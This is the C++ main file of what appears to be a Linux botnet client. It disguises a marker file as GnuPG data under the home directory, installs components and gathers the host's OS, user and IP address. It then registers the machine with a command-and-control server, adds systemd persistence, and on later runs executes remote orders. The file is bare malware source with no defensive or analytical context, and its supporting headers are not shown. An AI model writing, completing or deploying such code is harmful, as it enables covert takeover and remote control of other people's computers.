#include <iostream>
#include <fstream>
#include <string>

#include "cpp-linux.hh"
#include "c2/c2.hh"
#include "components/install.hh"

const std::string SEED_DIR = ".gnupg/.seeds";
const std::string SEED_FILE = ".seed_gnupg~";


int main()
{
    c2::Bot host;
    std::string homeDir, seedPath;

    homeDir = std::getenv("HOME");
    seedPath = homeDir + "/" + SEED_DIR + "/" + SEED_FILE;

    seed::Seed hostSeed(seedPath);

    if ( hostSeed.exists() ) {

        hostSeed.getSeed();

        host.hashSum = hostSeed.getHash();
        host.ipAddr = getIPAddr();
        host.executeOrder();

    } else {
        install::installFiles();

        hostSeed.initSeed();

        host.hashSum = hostSeed.getHash();
        host.os = getOS();
        host.user = getUser();
        host.ipAddr = getIPAddr();

        host.registerBot();

        install::initSystemd();
    }

    return 0;
}
